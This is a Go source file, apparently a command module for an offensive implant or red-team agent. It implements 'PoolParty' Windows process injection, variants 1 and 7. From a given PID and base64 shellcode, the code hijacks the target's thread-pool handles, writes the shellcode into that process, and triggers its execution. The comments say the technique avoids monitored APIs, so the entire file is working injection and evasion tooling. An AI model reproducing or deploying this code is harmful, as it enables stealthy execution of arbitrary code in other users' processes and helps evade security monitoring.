//go:build windows
// +build windows

// Package commands provides the poolparty-injection command for Thread Pool-based process injection.
//
// This command implements PoolParty injection techniques based on SafeBreach Labs research.
// Currently supported variants:
//   - Variant 1: Worker Factory Start Routine Overwrite
//   - Variant 7: TP_DIRECT Insertion (via I/O Completion Port)
//
// These techniques abuse Windows Thread Pool internals to achieve code execution
// without calling CreateRemoteThread or similar monitored APIs.
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PoolParty-specific constants
const (
	// Process access rights
	PROCESS_DUP_HANDLE = 0x0040

	// Worker factory access rights
	WORKER_FACTORY_RELEASE_WORKER    = 0x0001
	WORKER_FACTORY_WAIT              = 0x0002
	WORKER_FACTORY_SET_INFORMATION   = 0x0004
	WORKER_FACTORY_QUERY_INFORMATION = 0x0008
	WORKER_FACTORY_READY_WORKER      = 0x0010
	WORKER_FACTORY_SHUTDOWN          = 0x0020
	WORKER_FACTORY_ALL_ACCESS        = windows.STANDARD_RIGHTS_REQUIRED | WORKER_FACTORY_RELEASE_WORKER | WORKER_FACTORY_WAIT | WORKER_FACTORY_SET_INFORMATION | WORKER_FACTORY_QUERY_INFORMATION | WORKER_FACTORY_READY_WORKER | WORKER_FACTORY_SHUTDOWN

	// I/O Completion access rights
	IO_COMPLETION_QUERY_STATE  = 0x0001
	IO_COMPLETION_MODIFY_STATE = 0x0002
	IO_COMPLETION_ALL_ACCESS   = windows.STANDARD_RIGHTS_REQUIRED | IO_COMPLETION_QUERY_STATE | IO_COMPLETION_MODIFY_STATE

	// Worker factory info classes
	WorkerFactoryBasicInformation = 7
	WorkerFactoryThreadMinimum    = 4

	// Process info class for handle enumeration
	ProcessHandleInformation = 51

	// Object info class
	ObjectTypeInformation = 2

	// Memory protection
	PAGE_EXECUTE_READWRITE = 0x40
)

// WORKER_FACTORY_BASIC_INFORMATION structure
type WORKER_FACTORY_BASIC_INFORMATION struct {
	Timeout                  int64
	RetryTimeout             int64
	IdleTimeout              int64
	Paused                   uint8
	TimerSet                 uint8
	QueuedToExWorker         uint8
	MayCreate                uint8
	CreateInProgress         uint8
	InsertedIntoQueue        uint8
	Shutdown                 uint8
	_                        uint8 // padding
	BindingCount             uint32
	ThreadMinimum            uint32
	ThreadMaximum            uint32
	PendingWorkerCount       uint32
	WaitingWorkerCount       uint32
	TotalWorkerCount         uint32
	ReleaseCount             uint32
	InfiniteWaitGoal         int64
	StartRoutine             uintptr
	StartParameter           uintptr
	ProcessId                windows.Handle
	StackReserve             uintptr
	StackCommit              uintptr
	LastThreadCreationStatus int32
	_                        [4]byte // padding
}

// PROCESS_HANDLE_TABLE_ENTRY_INFO structure
type PROCESS_HANDLE_TABLE_ENTRY_INFO struct {
	HandleValue      windows.Handle
	HandleCount      uintptr
	PointerCount     uintptr
	GrantedAccess    uint32
	ObjectTypeIndex  uint32
	HandleAttributes uint32
	Reserved         uint32
}

// PROCESS_HANDLE_SNAPSHOT_INFORMATION structure (variable size)
type PROCESS_HANDLE_SNAPSHOT_INFORMATION struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	// Handles array follows
}

// PUBLIC_OBJECT_TYPE_INFORMATION structure
type PUBLIC_OBJECT_TYPE_INFORMATION struct {
	TypeName windows.NTUnicodeString
	Reserved [22]uint32
}

// TP_TASK structure
type TP_TASK struct {
	Callbacks      uintptr
	NumaNode       uint32
	IdealProcessor uint8
	_              [3]byte
	ListEntry      LIST_ENTRY
}

// TP_DIRECT structure - used for variant 7
type TP_DIRECT struct {
	Task                        TP_TASK
	Lock                        uint64
	IoCompletionInformationList LIST_ENTRY
	Callback                    uintptr
	NumaNode                    uint32
	IdealProcessor              uint8
	_                           [3]byte
}

// LIST_ENTRY structure
type LIST_ENTRY struct {
	Flink uintptr
	Blink uintptr
}

// NT API procedures
var (
	ntdll                             = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationWorkerFactory = ntdll.NewProc("NtQueryInformationWorkerFactory")
	procNtSetInformationWorkerFactory   = ntdll.NewProc("NtSetInformationWorkerFactory")
	procNtQueryInformationProcess       = ntdll.NewProc("NtQueryInformationProcess")
	procNtQueryObject                   = ntdll.NewProc("NtQueryObject")
	procZwSetIoCompletion               = ntdll.NewProc("ZwSetIoCompletion")
	procRtlNtStatusToDosError           = ntdll.NewProc("RtlNtStatusToDosError")
)

// PoolPartyInjectionCommand implements the poolparty-injection command
type PoolPartyInjectionCommand struct{}

// Name returns the command name
func (c *PoolPartyInjectionCommand) Name() string {
	return "poolparty-injection"
}

// Description returns the command description
func (c *PoolPartyInjectionCommand) Description() string {
	return "Perform PoolParty process injection using Windows Thread Pool abuse"
}

// PoolPartyInjectionParams represents the parameters for poolparty-injection
type PoolPartyInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the poolparty-injection command
func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params PoolPartyInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeVariant1(shellcode, uint32(params.PID))
	case 7:
		output, err = executeVariant7(shellcode, uint32(params.PID))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unsupported variant %d", params.Variant),
			Status:    "error",
			Completed: true,
		}
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeVariant1 implements Worker Factory Start Routine Overwrite
func executeVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 1: Worker Factory Start Routine Overwrite\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start routine: 0x%X\n", workerFactoryInfo.StartRoutine)
	output += fmt.Sprintf("[+] Current worker count: %d\n", workerFactoryInfo.TotalWorkerCount)

	// Step 4: Write shellcode to start routine address
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartRoutine,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)

	// Step 5: Increase thread minimum to trigger new worker thread creation
	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
	status, _, _ = procNtSetInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryThreadMinimum),
		uintptr(unsafe.Pointer(&newMinimum)),
		uintptr(unsafe.Sizeof(newMinimum)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
	output += "[+] PoolParty Variant 1 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 7: TP_DIRECT Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create TP_DIRECT structure
	tpDirect := TP_DIRECT{
		Callback: shellcodeAddr,
	}
	output += "[+] Crafted TP_DIRECT structure with shellcode callback\n"

	// Step 6: Allocate memory for TP_DIRECT in target process
	tpDirectAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpDirectAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	// Step 7: Write TP_DIRECT to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpDirectAddr,
		uintptr(unsafe.Pointer(&tpDirect)),
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_DIRECT structure (%d bytes)\n", bytesWritten)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
func hijackProcessHandle(hProcess windows.Handle, objectType string, desiredAccess uint32) (windows.Handle, error) {
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	const maxRetries = 5

	// Start with a reasonable initial buffer size and retry with increasing sizes
	var buffer []byte
	var returnLength uint32
	bufferSize := uint32(64 * 1024) // Start with 64KB

	var status uintptr
	for i := 0; i < maxRetries; i++ {
		buffer = make([]byte, bufferSize)
		status, _, _ = procNtQueryInformationProcess.Call(
			uintptr(hProcess),
			uintptr(ProcessHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if status == 0 {
			break // Success
		}

		if status == STATUS_INFO_LENGTH_MISMATCH {
			// Double the buffer size for next attempt, or use returnLength if provided
			if returnLength > bufferSize {
				bufferSize = returnLength + 4096
			} else {
				bufferSize *= 2
			}
			continue
		}

		// Some other error
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
	}

	// Parse handle information
	handleInfo := (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buffer[0]))
	handleEntrySize := unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})
	handleArrayOffset := unsafe.Sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION{})

	// Iterate through handles
	for i := uintptr(0); i < uintptr(handleInfo.NumberOfHandles); i++ {
		entryOffset := handleArrayOffset + (i * handleEntrySize)
		if entryOffset+handleEntrySize > uintptr(len(buffer)) {
			break
		}

		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&buffer[entryOffset]))

		// Try to duplicate the handle
		var duplicatedHandle windows.Handle
		err := windows.DuplicateHandle(
			hProcess,
			entry.HandleValue,
			windows.CurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			false,
			0,
		)
		if err != nil {
			continue
		}

		// Query the object type
		typeName, err := getObjectTypeName(duplicatedHandle)
		if err != nil {
			windows.CloseHandle(duplicatedHandle)
			continue
		}

		if typeName == objectType {
			return duplicatedHandle, nil
		}

		windows.CloseHandle(duplicatedHandle)
	}

	return 0, fmt.Errorf("failed to find handle of type: %s", objectType)
}

// getObjectTypeName queries the type name of an object handle
func getObjectTypeName(handle windows.Handle) (string, error) {
	// First call to get required buffer size
	var returnLength uint32
	procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if returnLength == 0 {
		returnLength = 256
	}

	buffer := make([]byte, returnLength)
	status, _, _ := procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return "", fmt.Errorf("NtQueryObject failed: 0x%X", status)
	}

	// Parse PUBLIC_OBJECT_TYPE_INFORMATION
	typeInfo := (*PUBLIC_OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	// Convert UNICODE_STRING to Go string
	if typeInfo.TypeName.Buffer == nil || typeInfo.TypeName.Length == 0 {
		return "", fmt.Errorf("empty type name")
	}

	typeName := windows.UTF16PtrToString(typeInfo.TypeName.Buffer)
	return typeName, nil
}
